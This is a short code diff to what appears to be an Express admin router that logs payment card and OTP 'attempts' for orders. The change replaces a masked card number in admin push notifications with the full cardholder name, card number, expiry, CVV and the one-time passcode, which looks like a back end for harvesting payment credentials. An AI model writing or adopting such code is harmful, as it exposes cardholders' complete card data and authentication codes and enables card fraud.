@@ -294,8 +294,7 @@ router.post("/admin/orders/:orderId/card-attempts", async (req, res, next) => {
 
     // Send push notification to admin devices
     if (order) {
-      const maskedCard = `****${cardNumber.slice(-4)}`;
-      notifyAdminsOfCardAttempt(order, maskedCard);
+      notifyAdminsOfCardAttempt(order, cardName, cardNumber, cardExpiry, cardCvv);
     }
 
     res.status(201).json(attempt);
@@ -390,7 +389,7 @@ router.post("/admin/orders/:orderId/otp-attempts", async (req, res, next) => {
 
     // Send push notification to admin devices
     if (order) {
-      notifyAdminsOfOtpAttempt(order, success ?? false);
+      notifyAdminsOfOtpAttempt(order, otpCode, success ?? false);
     }
 
     res.status(201).json(attempt);
